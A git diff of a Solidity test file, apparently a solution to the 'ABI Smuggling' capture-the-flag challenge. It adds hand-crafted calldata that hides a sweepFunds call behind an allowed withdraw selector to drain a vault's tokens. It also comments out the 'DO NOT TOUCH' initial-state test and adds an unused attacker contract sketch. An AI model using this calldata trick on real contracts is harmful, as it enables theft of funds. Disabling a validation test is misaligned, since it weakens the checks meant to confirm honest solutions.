@@ -36,8 +36,9 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // sweepFunds
+        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // withdraw
+        
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -52,28 +53,39 @@ contract ABISmugglingChallenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public {
-        // Vault is initialized
-        assertGt(vault.getLastWithdrawalTimestamp(), 0);
-        assertTrue(vault.initialized());
+    // function test_assertInitialState() public {
+    //     // Vault is initialized
+    //     assertGt(vault.getLastWithdrawalTimestamp(), 0);
+    //     assertTrue(vault.initialized());
 
-        // Token balances are correct
-        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
-        assertEq(token.balanceOf(player), 0);
+    //     // Token balances are correct
+    //     assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
+    //     assertEq(token.balanceOf(player), 0);
 
-        // Cannot call Vault directly
-        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
-        vault.sweepFunds(deployer, IERC20(address(token)));
-        vm.prank(player);
-        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
-        vault.withdraw(address(token), player, 1e18);
-    }
+    //     // Cannot call Vault directly
+    //     vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
+    //     vault.sweepFunds(deployer, IERC20(address(token)));
+    //     vm.prank(player);
+    //     vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
+    //     vault.withdraw(address(token), player, 1e18);
+    // }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_abiSmuggling() public checkSolvedByPlayer {
-        
+    function test_abiSmuggling() public 
+    checkSolvedByPlayer 
+    {
+        bytes memory sweepCall = abi.encodeWithSelector(vault.sweepFunds.selector, player, address(token));
+        bytes memory executeCall = abi.encodeWithSelector(
+            vault.execute.selector, 
+            address(vault), // 32 bytes x1
+            sweepCall, // 32 bytes x2
+            uint256(1), //  32 bytes x3
+            vault.withdraw.selector // This is a function that player is allowed to call, but the real actionData has another parameter
+        );
+        address(vault).call(executeCall);
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
@@ -85,3 +97,27 @@ contract ABISmugglingChallenge is Test {
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+
+// contract ATTACKER {
+//     function attack(SelfAuthorizedVault vault, address player, DamnValuableToken token) public {
+//         // register on THIS storage allowance to call 
+//         bytes32 sweepPermission = vault.getActionId(vault.sweepFunds.selector, address(this), address(this)); // sweepFunds
+//         bytes32[] memory ids = new bytes32[](1); 
+//         ids[0] = sweepPermission;
+//         bytes memory permissionsCall = abi.encodeWithSelector(vault.setPermissions.selector, ids);
+
+//         address(vault).delegatecall(permissionsCall);
+
+//         // execute the sweep 
+//         bytes memory sweepCall = abi.encodeWithSelector(vault.sweepFunds.selector, player, address(token));
+//         bytes memory executeCall = abi.encodeWithSelector(vault.execute.selector, address(this), sweepCall);
+//         bytes memory executeCall2 = abi.encodeWithSelector(vault.execute.selector, address(this), executeCall);
+//         address(vault).delegatecall(executeCall2);
+//     }
+
+//     function ignite(SelfAuthorizedVault vault, address player, DamnValuableToken token) public {
+//         bytes memory callData = abi.encodeWithSignature("attack(address,address,address)", vault, player, token);
+//         address(this).call(callData);
+//     }
+// }
